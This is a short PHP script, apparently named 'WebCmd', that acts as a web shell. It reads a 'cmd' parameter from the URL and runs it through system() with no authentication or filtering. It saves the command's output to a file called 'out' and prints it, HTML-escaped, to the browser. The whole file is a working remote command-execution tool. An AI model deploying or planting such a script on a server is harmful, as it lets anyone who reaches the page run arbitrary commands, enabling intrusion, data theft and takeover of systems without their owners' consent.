<?php

import_request_variables("g");

define("FILE", "out");

if ( !isset($cmd) )
	$cmd = "";

$cmd = trim($cmd);

if ( strpos($cmd, ">") ) {
	$output = "";
	system($cmd);
	goto bottom;
} else
	$realcmd = "$cmd > " . FILE;

system($realcmd, $val);		// gotta save it to a file to format the output for the browser

$output = file_get_contents(FILE);

// this next bit is sort of a rough error capture method.

if ( $val == 1 && empty($output) ) {
	
	system("$cmd 2> " . FILE);
	
	$output = file_get_contents(FILE);
	
}

// do the necessary fixing up of the text

$output = htmlentities($output);
$output = str_replace("\r\n", "<br>", $output);
$output = str_replace("\n", "<br>", $output);
$output = str_replace("\t", "", $output);

if ($cmd == "help")
	$output = str_replace("CMD.EXE", "WebCmd", $output);		// gotta rep it real mane

bottom:

print_r( $output);

?>